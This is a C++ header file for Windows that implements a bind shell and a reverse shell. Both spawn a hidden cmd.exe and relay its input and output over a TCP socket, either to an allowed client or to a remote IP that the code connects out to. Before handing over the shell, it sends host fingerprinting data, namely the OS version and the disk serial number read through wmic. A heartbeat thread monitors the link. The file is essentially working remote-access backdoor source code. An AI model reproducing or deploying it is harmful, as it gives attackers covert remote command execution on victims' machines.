#pragma once

#include "functions.h"
#include "status.h"

void checkHeartBeat(SOCKET s) {
    char buffer[1];
    while (true) {
        int result = recv(s, buffer, sizeof(buffer), MSG_PEEK);

        if (result == 0) {
            MessageBoxA(NULL, "You were removed from server watchlist", "Connection Error", MB_OK | MB_ICONERROR);
            break;
        }
        Sleep(5000);
    }
}

string getHDDSerialNumber() {

    char buffer[128];
    string result = "";
    FILE* pipe = _popen("wmic path win32_physicalmedia get SerialNumber", "r");

    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
        result += buffer;
    }

    _pclose(pipe);

    size_t pos = result.find("SerialNumber");
    if (pos != string::npos) {
        result.erase(pos, string("SerialNumber").length());
    }

    result.erase(0, result.find_first_not_of(" \n\r\t"));
    result.erase(result.find_last_not_of(" \n\r\t") + 1);

    if (!result.empty() && result.back() == '.') {
        result.pop_back();
    }

    return result;
}

string getWindowsVersion() {
    if (IsWindows8OrGreater()) return "Windows 10";
    if (IsWindows7OrGreater()) return "Windows 7";
    return "Unknown Windows Version";
}

void sendClientInfo(SOCKET s) {

    string osInfo = getWindowsVersion();

    string message = "OS: " + osInfo + "\n" + getHDDSerialNumber() + "\n";

    send(s, message.c_str(), message.length(), 0);
}

void bindShell(char* ip, int port) {

    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = INADDR_ANY; // Bind to all available interfaces

    // Bind the socket
    if (bind(s, (sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        MessageBoxA(NULL, "Failed to bind socket", "Bind Error", MB_OK | MB_ICONERROR);
        closesocket(s);
        WSACleanup();
        return;
    }

    // Start listening
    if (listen(s, SOMAXCONN) == SOCKET_ERROR) {
        MessageBoxA(NULL, "Failed to listen on socket", "Listen Error", MB_OK | MB_ICONERROR);
        closesocket(s);
        WSACleanup();
        return;
    }

    MessageBoxA(NULL, "Listening for incoming connections", "Listening", MB_OK | MB_ICONASTERISK);

    sockaddr_in clientAddr;
    int clientAddrSize = sizeof(clientAddr);
    SOCKET clientSocket = accept(s, (sockaddr*)&clientAddr, &clientAddrSize);

    if (clientSocket == INVALID_SOCKET) {
        MessageBoxA(NULL, "Failed to accept connection", "Accept Error", MB_OK | MB_ICONERROR);
        closesocket(s);
        WSACleanup();
        return;
    }

    // Check if the client's IP address matches the allowed IP
    char* clientIP = inet_ntoa(clientAddr.sin_addr); // Convert client's IP to string

    if (strcmp(clientIP, ip) != 0) {
        // If the client's IP does not match the allowed IP, close the connection
        MessageBoxA(NULL, "Connection from unauthorized IP", "Access Denied", MB_OK | MB_ICONERROR);
        closesocket(clientSocket);
        closesocket(s);
        WSACleanup();
        return;
    }

    MessageBoxA(NULL, "Connection accepted from authorized IP. OK to proceed", "Connection status", MB_OK | MB_ICONASTERISK);

    sendClientInfo(clientSocket);

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    HANDLE hStdInRead, hStdInWrite, hStdOutRead, hStdOutWrite;

    CreatePipe(&hStdInRead, &hStdInWrite, &sa, 0);
    CreatePipe(&hStdOutRead, &hStdOutWrite, &sa, 0);

    SetHandleInformation(hStdInWrite, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(hStdOutRead, HANDLE_FLAG_INHERIT, 0);

    si.hStdInput = hStdInRead;
    si.hStdOutput = hStdOutWrite;
    si.hStdError = hStdOutWrite;

    CreateProcessA(NULL, (LPSTR)"\\windows\\system32\\cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

    CloseHandle(hStdInRead);
    CloseHandle(hStdOutWrite);

    thread s2p_thread([&]() {
        char buffer[1024];
        DWORD bytesWritten;
        while (true) {
            int bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);
            if (bytesReceived <= 0) {
                break;
            }
            // Write received command from client to stdin of cmd.exe
            WriteFile(hStdInWrite, buffer, bytesReceived, &bytesWritten, NULL);
        }
        });

    thread p2s_thread([&]() {
        char buffer[1024];
        DWORD bytesRead;
        while (true) {
            if (ReadFile(hStdOutRead, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0) {
                // Send the output of cmd.exe back to the client
                send(clientSocket, buffer, bytesRead, 0);
            }
            else {
                break;
            }
        }
        });

    s2p_thread.join();
    p2s_thread.join();

    CloseHandle(hStdInWrite);
    CloseHandle(hStdOutRead);
    closesocket(clientSocket);
    closesocket(s);
    WSACleanup();
}

void revShell(char* ip, int port) {

    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(ip);

    if (connect(s, (sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {

        //MessageBoxA(NULL, "Failed to connect to the remote host", "Connection Error", MB_OK | MB_ICONERROR);
    }
    else {

        MessageBoxA(NULL, "Connection successful. OK to proceed", "Connection status", MB_OK | MB_ICONASTERISK);

        sendClientInfo(s);

        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi;

        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
        HANDLE hStdInRead, hStdInWrite, hStdOutRead, hStdOutWrite;

        CreatePipe(&hStdInRead, &hStdInWrite, &sa, 0);
        CreatePipe(&hStdOutRead, &hStdOutWrite, &sa, 0);

        SetHandleInformation(hStdInWrite, HANDLE_FLAG_INHERIT, 0);
        SetHandleInformation(hStdOutRead, HANDLE_FLAG_INHERIT, 0);

        si.hStdInput = hStdInRead;
        si.hStdOutput = hStdOutWrite;
        si.hStdError = hStdOutWrite;

        CreateProcessA(NULL, (LPSTR)"\\windows\\system32\\cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

        CloseHandle(hStdInRead);
        CloseHandle(hStdOutWrite);

        thread s2p_thread([&]() {
            char buffer[1024];
            DWORD bytesWritten;
            while (true) {
                int bytesReceived = recv(s, buffer, sizeof(buffer), 0);
                if (bytesReceived <= 0) {
                    break;
                }
                // Write received command from server to stdin of cmd.exe
                WriteFile(hStdInWrite, buffer, bytesReceived, &bytesWritten, NULL);
            }
            });

        thread p2s_thread([&]() {
            char buffer[1024];
            DWORD bytesRead;
            while (true) {
                if (ReadFile(hStdOutRead, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0) {
                    // Send the output of cmd.exe back to the server
                    send(s, buffer, bytesRead, 0);
                }
                else {
                    break;
                }
            }
            });

        /*auto checkHeartBeat = [](SOCKET s, char* ip, int port) {
            char buffer[1];
            while (true) {
                int result = recv(s, buffer, sizeof(buffer), MSG_PEEK);

                if (result == 0) {
                    MessageBoxA(NULL, "You were removed from server watchlist", "Connection Error", MB_OK | MB_ICONERROR);
                    break;
                    revShell(ip, port);
                }
                Sleep(5000);
            }
            };*/

        thread heartbeat_thread(checkHeartBeat, s);

        s2p_thread.join();
        p2s_thread.join();
        heartbeat_thread.join();

        CloseHandle(hStdInWrite);
        CloseHandle(hStdOutRead);
        closesocket(s);
        WSACleanup();
    }
}